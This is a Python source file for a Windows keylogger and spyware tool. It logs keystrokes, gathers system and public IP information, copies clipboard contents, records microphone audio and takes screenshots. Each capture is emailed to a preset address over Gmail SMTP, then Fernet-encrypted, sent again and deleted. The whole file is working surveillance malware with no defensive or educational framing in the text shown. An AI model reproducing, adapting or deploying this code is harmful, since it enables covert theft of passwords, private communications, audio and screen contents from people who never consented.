# libraries for email
import email
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import importlib
from itertools import count
import smtplib
from redmail import EmailSender

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "system.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_encrypt = "key_log_encrypted.txt"
system_information_encrypted = "system_encrypted.txt"
clipboard_information_encrypt = "clipboard_encrypted.txt"

time_iteration = 15
audio_time = 10

keys_information = "key_log.txt"
file_path = "D:\\python\\Keylogger\\keylogger\\Project_File"
extend = "\\"

email_address = "email@email.com"
password = "password"
toaddr = "email@email.com"

# keylogging finctionality
count = 0
keys = []
key = "1iDy_ow79Uf-ZuSRf6WhRg1onb1Pix8oCpAgBbbFlVY="

no_of_iterations = 0
no_of_iterations_end = 3
currentTime = time.time()
stopingTime = time.time() + time_iteration


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# email controls


def send_email(filename, attachment, toaddr):
    fromaddr = "email@email.com"
    msg = MIMEMultipart()  # format emailmessages to characters texts and email attachments

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "INFORMATION"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, "rb")

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

# get the computer information


def computer_information():
    with open(file_path + extend + system_information, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            # to get public ip address but has count limit
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")
        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System: " + platform.system() +
                " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# get the clipboard contents


def copy_clipboard():
    with open(file_path + extend + "clipboard.txt", "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")

# record the microphone for 10s


def microphone():
    fs = 44100
    seconds = audio_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# get present time screenshot


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


# calling the functions and sending them to user via mail
def output():
    send_email(keys_information, file_path + extend + keys_information, toaddr)
    computer_information()
    send_email(system_information, file_path +
               extend + system_information, toaddr)
    copy_clipboard()
    send_email(clipboard_information, file_path +
               extend + clipboard_information, toaddr)
    microphone()
    send_email(audio_information, file_path +
               extend + audio_information, toaddr)
    screenshot()
    send_email(screenshot_information, file_path +
               extend + screenshot_information, toaddr)


output()


# encrypting the files
files_to_encrypt = [file_path + extend + keys_information, file_path +
                    extend + system_information, file_path + extend + clipboard_information]
encrypted_file_names = [file_path + extend + keys_information_encrypt, file_path +
                        extend + system_information_encrypted, file_path + extend + clipboard_information_encrypt]

count = 0

for encrypting_file in files_to_encrypt:
    with open(encrypting_file, "rb") as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], "wb") as f:
        f.write(encrypted)
    # os.remove(encrypting_file)
    send_email(encrypted_file_names[count],
               encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)  # waiting for 2 minutes

# deleting the encrypted files
delete_files = [keys_information, system_information,
                clipboard_information, audio_information, screenshot_information]
for file in delete_files:
    os.remove(file_path + extend + file)
